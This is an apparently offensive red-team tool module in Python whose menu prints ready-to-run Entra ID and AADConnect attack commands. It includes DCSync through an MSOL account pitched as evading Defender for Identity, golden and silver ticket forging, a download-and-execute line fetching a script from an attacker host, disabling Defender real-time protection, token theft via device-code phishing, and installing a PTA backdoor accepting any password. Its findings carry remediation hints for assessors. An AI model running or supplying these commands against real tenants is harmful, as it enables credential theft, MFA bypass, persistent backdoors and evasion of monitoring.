"""
Module: Entra ID / Azure AD Hybrid Identity Attacks
Techniques: MSOL account abuse, AADConnect exploitation, PHS/PTA abuse,
            Pass-the-PRT, Device Code Phishing, Seamless SSO abuse
"""
from utils.helpers import *
from config.settings import SESSION

def run():
    print_banner("ENTRA / HYBRID IDENTITY", "Azure AD · AADConnect · PHS · PTA · PRT")
    dc      = input_or_session("dc_ip",      "DC IP")
    dom     = input_or_session("domain",     "On-prem Domain (e.g. techcorp.local)")
    user    = input_or_session("username",   "Username")
    pw      = input_or_session("password",   "Password")
    tenant  = prompt("Azure Tenant (e.g. techcorp.onmicrosoft.com)") or "tenant.onmicrosoft.com"

    print(f"""
  {C}── MSOL / AADConnect ────────────────────────────────────────────{RST}
  [1]  Enumerate MSOL_* Account          (Password Hash Sync service acct)
  [2]  MSOL Account → DCSync             (MDI-bypass — whitelisted acct)
  [3]  AADConnect DB Credential Extract  (azuread_decrypt_msol)
  {C}── PASS-THE-PRT ──────────────────────────────────────────────────{RST}
  [4]  Enumerate PRT                     (roadrecon / AADInternals)
  [5]  Pass-the-PRT                      (RequestAADRefreshToken)
  {C}── SEAMLESS SSO ─────────────────────────────────────────────────{RST}
  [6]  Silver Ticket → Seamless SSO      (AZUREADSSOACC$ → access cloud)
  {C}── DEVICE CODE PHISHING ────────────────────────────────────────{RST}
  [7]  Device Code Phishing Flow         (get access token via phish)
  {C}── PTA BACKDOOR ─────────────────────────────────────────────────{RST}
  [8]  PTA Backdoor via PowerShell Agent (accept any password for any user)
  [0]  Back
""")
    c = input(f"  {M}Choice:{RST} ").strip()

    if c == "1":
        print(f"""
  {NEON_CYN}Enumerate MSOL_* Account (Password Hash Sync):{RST}

  # PowerView
  Get-DomainUser -Identity "MSOL_*" -Domain {dom}
  Get-DomainUser -Filter "samAccountName -like 'MSOL_*'" | select cn,description,memberof

  # AD Module
  Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Properties Description,MemberOf | select Name,Description

  # From Linux (ldapsearch)
  ldapsearch -x -H ldap://{dc} -D '{user}@{dom}' -w '{pw}' \\
    -b 'DC={dom.replace(".", ",DC=")}' '(samAccountName=MSOL_*)' cn description memberOf

  {NEON_CYN}Why MSOL_* matters:{RST}
  {DIM}• Created by AADConnect to sync password hashes to Azure AD
  • Has DCSync rights (DS-Replication-Get-Changes + DS-Replication-Get-Changes-All)
  • Whitelisted in Microsoft Defender for Identity (MDI) — DCSync by this account
    does NOT generate an MDI alert → stealth DCSync!{RST}
""")

    elif c == "2":
        msol_user = prompt("MSOL account name (e.g. MSOL_16fb75d0227d)")
        msol_pw   = prompt("MSOL account password")
        print(f"""
  {NEON_CYN}MSOL Account → Stealth DCSync (bypasses MDI):{RST}

  ── Step 1: Verify MSOL account credentials ──────────────────────────────
  runas /user:{dom}\\{msol_user} /netonly cmd.exe
  # Enter password: {msol_pw if msol_pw else '<msol_password>'}

  ── Step 2: DCSync as MSOL (MDI-whitelisted — no alert!) ─────────────────
  # In new process context (after runas /netonly):
  Invoke-Mimi -Command '"lsadump::dcsync /user:{dom}\\krbtgt /domain:{dom}"'
  Invoke-Mimi -Command '"lsadump::dcsync /user:{dom}\\Administrator /domain:{dom}"'

  # Or from Linux (with MSOL credentials):
  impacket-secretsdump {dom}/{msol_user}:'{msol_pw if msol_pw else "<msol_pw>"}'@{dc} -just-dc-ntlm

  ── Step 3: Use dumped krbtgt hash for Golden Ticket ─────────────────────
  Invoke-Mimi -Command '"kerberos::golden /User:Administrator /domain:{dom} /SID:<domSID> /krbtgt:<hash> /ptt"'

  {NEON_CYN}Detection bypass rationale:{RST}
  {DIM}MDI has a built-in whitelist for MSOL_* accounts performing replication.
  Standard DCSync alerts are suppressed for this account.
  This is a known gap — reported in multiple CRTO/CRTE labs.{RST}
""")
        add_finding("MSOL Account DCSync (MDI Bypass)", "Critical",
                    f"MSOL sync account used to DCSync — bypasses MDI replication alerts on {dc}",
                    "Rotate MSOL account password; apply tiered MDI alert policy for sync accounts")

    elif c == "3":
        aadconnect_host = prompt("AADConnect server hostname or IP")
        print(f"""
  {NEON_CYN}AADConnect DB — Extract MSOL Credentials:{RST}

  {DIM}AADConnect stores MSOL credentials in encrypted form in SQL LocalDB.
  With local admin on the AADConnect server, credentials can be decrypted.{RST}

  ── Method 1: azuread_decrypt_msol (PowerShell — CRTP/AD-Advanced) ───────
  # Run on AADConnect server as local admin:
  IEX (New-Object Net.WebClient).DownloadString('http://<attacker>/azuread_decrypt_msol.ps1')

  # Explicit adconnect.ps1 (Adam Chester / xpnsec):
  . .\\adconnect.ps1
  # Output: MSOL_<id> + cleartext password

  ── Method 2: AADInternals ───────────────────────────────────────────────
  Import-Module AADInternals
  # Requires local admin on AADConnect server:
  Get-AADIntSyncCredentials

  ── Method 3: adconnectdump (Python) ─────────────────────────────────────
  # From Kali (requires SMB access to AADConnect server):
  python3 adconnectdump.py {dom}/{user}:'{pw}'@{aadconnect_host if aadconnect_host else "<aadconnect_server>"}

  ── Method 4: Manual SQL query ───────────────────────────────────────────
  # On AADConnect server (SQL LocalDB — ADSync database):
  $cmd = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
  Invoke-Sqlcmd -Query $cmd -ServerInstance "(localdb)\\ADSync"

  # Get encrypted credentials:
  $cmd2 = "SELECT encrypted_configuration FROM mms_management_agent WHERE subtype = 'AD'"
  Invoke-Sqlcmd -Query $cmd2 -ServerInstance "(localdb)\\ADSync"

  ── Full workflow (adconnect.ps1 method) ─────────────────────────────────
  # 1. Get onto AADConnect server (requires local admin — pivot via WinRM/PSExec):
  Enter-PSSession -ComputerName {aadconnect_host if aadconnect_host else "<aadconnect_host>"} \\
    -Credential {dom}\\{user}

  # 2. Bypass AMSI + load script:
  Set-MpPreference -DisableRealtimeMonitoring $true
  . .\\adconnect.ps1

  # 3. Result — extract returned credentials:
  # Username: MSOL_<hex>
  # Password: <plaintext>

  # 4. Use extracted MSOL creds for MDI-bypass DCSync (see option [2])

  {NEON_CYN}Result:{RST} {DIM}Plaintext MSOL username + password → use for stealth DCSync (option [2]){RST}
""")
        add_finding("AADConnect Credential Extraction", "Critical",
                    f"MSOL credentials extracted from AADConnect LocalDB on {aadconnect_host or 'AADConnect server'}",
                    "Enable Credential Guard; restrict local admin access to AADConnect server; rotate MSOL password")

    elif c == "4":
        print(f"""
  {NEON_CYN}Pass-the-PRT — Enumerate PRT (Primary Refresh Token):{RST}

  {DIM}PRT is issued to Azure AD-joined/registered devices.
  Valid PRT = access to any cloud resource the user has access to.{RST}

  ── Enumerate via AADInternals ────────────────────────────────────────────
  Import-Module AADInternals
  # Get PRT from current session (on Azure AD-joined device):
  $prt = Get-AADIntUserPRTToken
  $prt | ConvertTo-Json

  ── Dump PRT with ROADrecon ──────────────────────────────────────────────
  roadrecon auth --prt-init
  roadrecon gather

  ── From browser (Chrome/Edge) — dpapi-protected ─────────────────────────
  # SharpChromium or similar to extract PRT-protected tokens
  SharpChromium.exe cookies all
  SharpChromium.exe logins all

  ── Mimikatz — dpapi PRT cookie ──────────────────────────────────────────
  Invoke-Mimi -Command '"sekurlsa::cloudap"'    # dumps PRT + session key

  {NEON_CYN}PRT Cookie Generation:{RST}
  $PRTCookie = Get-AADIntUserPRTToken -UsePRT $prt
  # Use cookie in browser to access portal.azure.com, teams, etc.
""")

    elif c == "5":
        print(f"""
  {NEON_CYN}Pass-the-PRT — Access Cloud Resources:{RST}

  ── AADInternals — request token with PRT ────────────────────────────────
  Import-Module AADInternals

  # Get a PRT (must be on AzureAD-joined/registered device):
  $prt = Get-AADIntUserPRTToken

  # Request access token for specific resource:
  $token = Get-AADIntAccessTokenForAADGraph -PRTToken $prt
  $token = Get-AADIntAccessTokenForMSGraph -PRTToken $prt
  $token = Get-AADIntAccessTokenForAzureCoreManagement -PRTToken $prt

  # Use token to enumerate cloud:
  Get-AADIntTenantDetails -AccessToken $token
  Get-AADIntUsers -AccessToken $token

  ── Browser Injection (Pass-the-PRT cookie) ───────────────────────────────
  # Use BrowserHelper or manually inject PRT cookie into browser
  # Navigate to https://login.microsoftonline.com
  # Open DevTools → Application → Cookies
  # Set "x-ms-RefreshTokenCredential" = <base64_prt_cookie>
  # Navigate to portal.azure.com — authenticated as victim

  {DIM}Requirement: Must be on or have a session on an Azure AD-joined device.
  PRT is device+user bound — cannot use on different hardware without session key.{RST}
""")

    elif c == "6":
        print(f"""
  {NEON_CYN}Seamless SSO — Silver Ticket Attack on AZUREADSSOACC$:{RST}

  {DIM}Azure AD Seamless SSO creates AZUREADSSOACC$ computer account.
  Its NTLM hash can forge Kerberos Silver Tickets → access cloud apps
  without needing valid cloud credentials.{RST}

  ── Step 1: Extract AZUREADSSOACC$ hash ──────────────────────────────────
  # DCSync (requires DCSync rights or MSOL account):
  Invoke-Mimi -Command '"lsadump::dcsync /user:{dom}\\AZUREADSSOACC$"'

  ── Step 2: Get domain SID ───────────────────────────────────────────────
  Get-DomainSID   # or: (Get-ADDomain).DomainSID.Value

  ── Step 3: Forge Silver Ticket ──────────────────────────────────────────
  Invoke-Mimi -Command '"kerberos::golden /user:<any_cloud_user> /domain:{dom} /sid:<domSID> /rc4:<azureadssoacc_hash> /target:aadg.windows.net.nsatc.net /service:HTTP /ptt"'

  ── Step 4: Request cloud access token ───────────────────────────────────
  Import-Module AADInternals
  $token = Get-AADIntAccessTokenForMSGraph -KerberosTicket $kerbTicket -Domain {dom}

  {NEON_CYN}Alternatively (AADInternals):{RST}
  # Directly forge PRT using AZUREADSSOACC$ NTLM hash:
  Get-AADIntAccessTokenForMSGraph -PRT (New-AADIntUserPRTFromDesktopSSOToken -SSOToken <ticket>)
""")
        add_finding("Seamless SSO Silver Ticket", "Critical",
                    f"AZUREADSSOACC$ hash used to forge Silver Ticket → cloud access without MFA",
                    "Rotate AZUREADSSOACC$ password twice (aadpwd rollover); monitor Kerberos tickets for aadg.windows.net.nsatc.net")

    elif c == "7":
        print(f"""
  {NEON_CYN}Device Code Phishing — Steal Access Token via OAuth Device Flow:{RST}

  {DIM}Abuses the OAuth 2.0 Device Authorization Grant flow.
  No credentials needed — victim just clicks a link and enters a code.{RST}

  ── Step 1: Request device code ──────────────────────────────────────────
  Import-Module AADInternals

  $response = Invoke-RestMethod -Method POST \\
    "https://login.microsoftonline.com/{tenant}/oauth2/v2.0/devicecode" \\
    -Body @{{client_id="d3590ed6-52b3-4102-aeff-aad2292ab01c"; scope="openid profile offline_access"}}

  $response.user_code    # → Give this to victim
  $response.device_code  # → Use to poll

  ── Step 2: Send phishing link to victim ─────────────────────────────────
  # Victim visits: https://microsoft.com/devicelogin
  # Victim enters user_code from step 1
  # Victim authenticates (including MFA if required)

  ── Step 3: Poll for token (attacker side) ───────────────────────────────
  $token = Invoke-RestMethod -Method POST \\
    "https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token" \\
    -Body @{{
      client_id  = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
      grant_type = "urn:ietf:params:oauth:grant-type:device_code"
      device_code= $response.device_code
    }}

  # Got access_token + refresh_token!

  ── Step 4: Use token ────────────────────────────────────────────────────
  $headers = @{{Authorization="Bearer $($token.access_token)"}}
  Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me" -Headers $headers
  Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/users" -Headers $headers

  {DIM}• Bypasses MFA (victim completes MFA, attacker gets the token)
  • Token valid for refresh period (up to 90 days with refresh_token)
  • No phishing page needed — just a code to type at Microsoft's own site{RST}
""")

    elif c == "8":
        print(f"""
  {NEON_CYN}PTA (Pass-Through Authentication) Backdoor:{RST}

  {DIM}PTA agent runs on AADConnect server and validates on-prem credentials
  for cloud sign-ins. Compromising/backdooring it = accept any password.{RST}

  ── Install backdoor via AADInternals ────────────────────────────────────
  # Run on AADConnect server as local admin:
  Import-Module AADInternals

  # Install a rogue PTA agent (accepts ANY password for ALL users):
  Install-AADIntPTASpy

  # Monitor accepted authentications:
  Get-AADIntPTASpyLog -DecodePasswords

  ── Alternative: manipulate PTA agent DLL ────────────────────────────────
  # PTA agent at: C:\\Program Files\\Microsoft Azure AD Connect Auth Agent\\
  # Replace validation logic in AzureADConnectAuthenticationAgentService.exe

  {NEON_CYN}Effect:{RST}
  {DIM}Once backdoored, ANY user can sign in to Azure AD / M365 / cloud apps
  with ANY password (including a blank one).
  All authentications still appear as "Password Authentication" in logs.{RST}
""")
        add_finding("PTA Backdoor Installed", "Critical",
                    "AADInternals PTA spy installed — any password accepted for all cloud users",
                    "Audit PTA agents; monitor AADConnect server for unauthorized changes; use FIDO2 phishing-resistant MFA")

    pause()
